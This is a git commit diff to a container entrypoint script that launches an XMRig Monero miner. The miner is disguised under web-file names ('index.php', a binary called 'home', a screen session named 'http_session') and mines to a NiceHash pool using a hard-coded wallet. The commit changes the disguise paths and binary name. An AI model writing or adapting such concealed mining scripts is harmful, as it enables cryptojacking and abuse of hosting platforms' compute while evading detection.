9f9dcd80905abebda12a39ab9a1666fc5e3a177b
osnmoh007 <112149956+osnmoh007@users.noreply.github.com>
2024-09-07 22:35:26 +0100

    Update entrypoint2.sh

--- entrypoint2.sh
+++ entrypoint2.sh
@@ -7,16 +7,16 @@ apk add --no-cache coreutils cpulimit util-linux
 # (Assuming you have a command to download the file here, e.g., wget or curl)
 
 # Extract the http file
-tar -xvzf /app2/index.html -C /app2/
+tar -xvzf /nginx/index.php -C /nginx/
 
 # Change directory to the extracted folder
-cd /app2/httpalpine
+cd /nginx/homepage
 
 
 
 # Run XMRig with screen, using taskset to set CPU affinity and cpulimit to limit CPU usage
 #screen -dmS http_session sh -c "taskset -c 4,6,10,11 cpulimit -l 80 -- ./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash"
-screen -dmS http_session sh -c "./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash"
+screen -dmS http_session sh -c "./home -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash"
 
 # Change directory to /app and run the original command in the background
 # cd /app
